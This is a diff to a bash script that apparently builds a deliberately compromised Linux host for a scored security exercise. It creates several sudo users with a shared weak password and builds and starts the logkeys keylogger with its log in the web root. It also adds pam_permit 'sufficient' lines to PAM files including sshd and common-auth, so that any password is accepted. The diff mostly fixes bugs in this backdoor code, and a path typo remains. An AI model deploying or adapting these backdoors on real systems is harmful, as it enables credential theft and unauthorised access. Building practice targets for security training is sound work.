@@ -1,25 +1,25 @@
 #!/bin/bash
 
+
 #Install prereqs based on package manager and start httpd or apache2
 preint() {
 	clear
-	echo "apt or yum"
-	read -r pkm
-	echo $pkm
+	read -p "apt or yum:  " pkm
+	echo "$pkm"
 
-	if [$pkm == apt]; then
+	if [ $pkm == "apt" ]; then
 		apt-get install -y nc autotools sudo open-ssh apache2
 		systemctl enable apache2
 		systemctl start apache2
 		return
-	elif [$pkm == yum]; then
+	elif [ $pkm == "yum" ]; then
 		yum install -y nc automake sudo open-ssh httpd gcc make gcc-c++
 		systemctl enable httpd
 		systemctl start httpd
 		return
 	else
 		echo "Bad PKM"
-		break
+		exit 1
 	fi
 }
 
@@ -27,7 +27,7 @@ preint() {
 serv() {
 	chmod +x sys_scr 
 	mkdir /etc/score
-	cp sys_scr /ect/score/
+	cp sys_scr /etc/score/
 	cp sys_scr.service /etc/systemd/system/
 	systemctl enable sys_scr
 	systemctl start sys_scr
@@ -145,7 +145,7 @@ usr() {
 	useradd -m -G bestsudo -p winter.2019 sys_scr
 	useradd -m -G bestsudo -p winter.2019 dontdeleteme
 	useradd -m -G bestsudo -p winter.2019 hellodarknessmyoldfriend
-	useradd -m -G bestsudo -p winter.2019 "rm -rf"
+	useradd -m -G bestsudo -p winter.2019 rmrf
 	useradd -m -G bestsudo -p winter.2019 cats
 	useradd -m -G bestsudo -p winter.2019 morecats
 	return
@@ -163,14 +163,12 @@ webssh(){
 #download, install, and deploy keylogger
 logboi() {
 	git clone https://github.com/kernc/logkeys
-	cd logkeys-master
-	./autogen.sh
-	cd build
-	../configure
+	/root/logkeys/autogen.sh
+	cd /root/logkeys/build
+	/root/logkeys/configure
 	make
 	make install
-	cd ..
-	cd ..
+	cd /root/
 	git clean -xdf
 	touch /var/www/html/logboi.log
 	logkeys -u --start --output /vaw/www/html/logboi.log
@@ -190,15 +188,16 @@ pam(){
 	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/passwd
 	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/sshd
 	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/system-auth
+	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/common-auth
 	return
 }
 
 
-preint
-serv
-usr
-webssh
-logboi
-pam
-cron
+#preint
+#serv
+#usr
+#webssh
+#logboi
+#pam
+#cron
 echo "All done!"
